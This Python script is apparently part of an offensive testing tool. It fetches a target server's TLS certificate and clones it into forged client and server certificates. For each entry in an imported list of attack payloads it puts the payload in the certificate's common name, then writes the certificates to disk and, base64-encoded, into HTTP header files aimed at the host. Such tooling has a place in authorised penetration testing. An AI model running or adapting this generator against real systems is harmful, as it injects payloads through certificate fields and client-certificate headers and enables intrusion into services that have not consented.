#!/usr/bin/env python3

import logging
import base64
import sys

from pathlib import Path

from lib.helpers._logging import initialize_logger, set_loglevel
from lib.helpers._time import utc_formatted
from lib.helpers._argparse import parse_certgen_cmdline_arguments
from lib.helpers._filesystem import write_certs_to_output_dir
from lib.helpers._socket import obtain_server_cert
from lib.helpers._cert_generating import make_client_cert, cert_and_key_to_pems
from lib.helpers._cert_parsing import make_name_for_cert

from lib.payloads import CERT_HEADERS, ATTACK_PAYLOADS
from lib.config import GEN_CERT_DIR


args = parse_certgen_cmdline_arguments()

initialize_logger()
set_loglevel(args.loglevel)

logging.info("Cert generation started at %s\n" % utc_formatted())


if not args.certfiles and not args.headers:
  sys.exit( logging.critical("Choose an output format (headers, certfiles or both)") )


def make_attack_cert(cert_to_clone, args, prefix, cert_type = 'user', cn_override = None):
  if cn_override:
    args.cn = cn_override

  output_cn = args.cn if args.cn != None else 'default'

  cert, key = make_client_cert(cert_to_clone, args.host, args.cn, type = cert_type, callback=args.callback)
  cert_pem, key_pem = cert_and_key_to_pems(cert, key)
  cert_name = make_name_for_cert(cert, args.host, args.port, prefix = prefix)

  if args.headers:
    cert_pem_b64 = base64.b64encode(cert_pem).decode()

    with open(headers_outfile, 'a') as fout:
      for header in CERT_HEADERS:
        fout.write(f"{header}: {cert_pem_b64}\n")

        logging.info(f"Wrote header {header} for cert {cert_name} with cn: {output_cn}")

  if args.certfiles:
    cert_name = make_name_for_cert(cert, args.host, args.port, prefix = prefix)
    cert_dir = write_certs_to_output_dir(GEN_CERT_DIR, cert_pem, key_pem, cert_name)

    logging.info(f"Cert created ({cert_dir}) with cn: {output_cn}")

if args.headers:
  headers_outfile = Path('headers') / f"headers_{args.host}.{args.port}.txt"

server_cert = obtain_server_cert(args.host, args.port)

make_attack_cert(server_cert, args, prefix = 'simple_', cert_type = 'server')
make_attack_cert(server_cert, args, prefix = 'simple_')

args.onlysimple and exit(0)

for payload in ATTACK_PAYLOADS:
  make_attack_cert(server_cert, args, prefix = 'attack_', cn_override = payload, cert_type = 'server')
  make_attack_cert(server_cert, args, prefix = 'attack_', cn_override = payload)

